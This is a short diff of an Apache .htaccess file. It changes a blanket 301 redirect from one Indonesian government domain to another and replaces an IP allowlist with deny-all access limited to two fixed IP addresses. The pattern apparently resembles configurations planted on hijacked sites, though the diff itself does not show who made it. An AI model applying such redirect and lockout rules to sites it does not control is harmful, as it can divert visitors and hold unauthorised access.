@@ -16,7 +16,7 @@ RewriteRule .* - [F,L]
 
 Options -Indexes
 
-RewriteRule ^(.*)$ https://rsud.pidiejayakab.go.id/ [R=301,L]
+RewriteRule ^(.*)$ https://dwp.sarmikab.go.id/ [R=301,L]
 </IfModule>
 
 <IfModule mod_php7.c>
@@ -26,10 +26,8 @@ RewriteRule ^(.*)$ https://rsud.pidiejayakab.go.id/ [R=301,L]
   php_flag engine Off
 </IfModule>
 
-php_flag display_errors Off
-
-SetEnvIf X-Forwarded-For "^136.228.135.175$" allowed_ip
-
-Order Deny,Allow
+Order deny,allow
 Deny from all
-Allow from env=allowed_ip
+
+Allow from 116.212.130.44
+Allow from 103.77.106.41
